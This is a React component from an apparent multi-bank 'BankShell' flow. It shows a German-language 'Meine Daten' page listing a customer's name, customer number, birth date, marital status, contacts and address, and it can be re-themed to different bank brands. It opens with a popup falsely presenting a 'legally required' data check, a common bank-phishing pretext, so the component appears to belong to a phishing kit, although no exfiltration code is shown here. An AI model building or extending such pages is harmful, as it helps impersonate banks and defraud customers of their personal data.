import { useState } from "react";
import { ChevronRight, Pencil, Cake, Heart, Mail, Smartphone, CheckCircle2, X } from "lucide-react";
import type { FlowTheme } from "./BankShell";

export type CustomerData = {
  anrede: string;
  name: string;
  kundenNr: string;
  geburtsdatum: string;
  familienstand: string;
  email: string;
  mobilNr: string;
  adresse: { strasse: string; plzOrt: string };
};

export function PersonalDataStep({
  theme,
  customer,
  onContinue,
  onEditAddress,
}: {
  theme: FlowTheme;
  customer: CustomerData;
  onContinue: () => void;
  onEditAddress: () => void;
}) {
  const themeColor = theme.headerBg === "#ffffff" ? theme.buttonBg : theme.headerBg;
  const [showPopup, setShowPopup] = useState(true);

  const Row = ({ label, value, icon }: { label: string; value: string; icon?: React.ReactNode }) => (
    <div className="flex items-center justify-between py-3 border-b border-gray-100 last:border-0">
      <div className="flex items-center gap-3 min-w-0">
        {icon && <div className="text-gray-400 flex-shrink-0">{icon}</div>}
        <div className="min-w-0">
          <div className="text-xs text-gray-500">{label}</div>
          <div className="text-sm font-medium text-gray-900 truncate">{value || "—"}</div>
        </div>
      </div>
    </div>
  );

  return (
    <div className="max-w-3xl mx-auto space-y-6">
      <div>
        <h2 className="text-2xl sm:text-3xl font-bold" style={{ color: themeColor }}>
          Meine Daten
        </h2>
        <p className="text-sm text-gray-600 mt-1">
          Bitte prüfen Sie Ihre persönlichen Daten und bestätigen Sie deren Richtigkeit.
        </p>
      </div>

      <section className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
        <div className="px-6 py-4 border-b border-gray-100 flex items-center justify-between">
          <h3 className="font-semibold text-gray-900">Persönliche Angaben</h3>
        </div>
        <div className="px-6 py-2 divide-y divide-gray-100">
          <Row label="Name" value={`${customer.anrede} ${customer.name}`} />
          <Row label="Kundennummer" value={customer.kundenNr} />
          <Row label="Geburtsdatum" value={customer.geburtsdatum} icon={<Cake className="w-4 h-4" />} />
          <Row label="Familienstand" value={customer.familienstand} icon={<Heart className="w-4 h-4" />} />
        </div>
      </section>

      <section className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
        <div className="px-6 py-4 border-b border-gray-100">
          <h3 className="font-semibold text-gray-900">Kontaktdaten</h3>
        </div>
        <div className="px-6 py-2 divide-y divide-gray-100">
          <Row label="E-Mail (privat)" value={customer.email} icon={<Mail className="w-4 h-4" />} />
          <Row label="Mobil (privat)" value={customer.mobilNr} icon={<Smartphone className="w-4 h-4" />} />
        </div>
      </section>

      <section className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
        <div className="px-6 py-4 border-b border-gray-100 flex items-center justify-between">
          <h3 className="font-semibold text-gray-900">Adresse</h3>
          <button
            type="button"
            onClick={onEditAddress}
            className="inline-flex items-center gap-1 text-sm font-medium"
            style={{ color: theme.accentText }}
          >
            <Pencil className="w-4 h-4" /> Bearbeiten
          </button>
        </div>
        <div className="px-6 py-4">
          <p className="text-sm text-gray-900">{customer.adresse.strasse}</p>
          <p className="text-sm text-gray-900">{customer.adresse.plzOrt}</p>
        </div>
      </section>

      <div className="flex justify-end">
        <button
          type="button"
          onClick={onContinue}
          className={`px-6 py-3 ${theme.buttonRadius} text-white font-medium hover:opacity-90 inline-flex items-center gap-2`}
          style={{ backgroundColor: theme.buttonBg }}
        >
          Weiter <ChevronRight className="w-4 h-4" />
        </button>
      </div>

      {showPopup && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 p-4">
          <div className="bg-white rounded-xl max-w-md w-full p-6 shadow-xl relative">
            <button
              type="button"
              onClick={() => setShowPopup(false)}
              className="absolute top-3 right-3 text-gray-400 hover:text-gray-600"
              aria-label="Schließen"
            >
              <X className="w-5 h-5" />
            </button>
            <div className="flex items-start gap-3">
              <CheckCircle2 className="w-6 h-6 flex-shrink-0" style={{ color: theme.accentText }} />
              <div>
                <h4 className="font-semibold text-gray-900 mb-1">Kurze Datenprüfung</h4>
                <p className="text-sm text-gray-600">
                  Wir sind gesetzlich verpflichtet, Ihre hinterlegten Daten regelmäßig zu überprüfen.
                  Bitte prüfen Sie Ihre Angaben und bestätigen Sie diese.
                </p>
              </div>
            </div>
            <div className="mt-5 flex justify-end">
              <button
                type="button"
                onClick={() => setShowPopup(false)}
                className={`px-5 py-2 ${theme.buttonRadius} text-white text-sm font-medium hover:opacity-90`}
                style={{ backgroundColor: theme.buttonBg }}
              >
                Verstanden
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
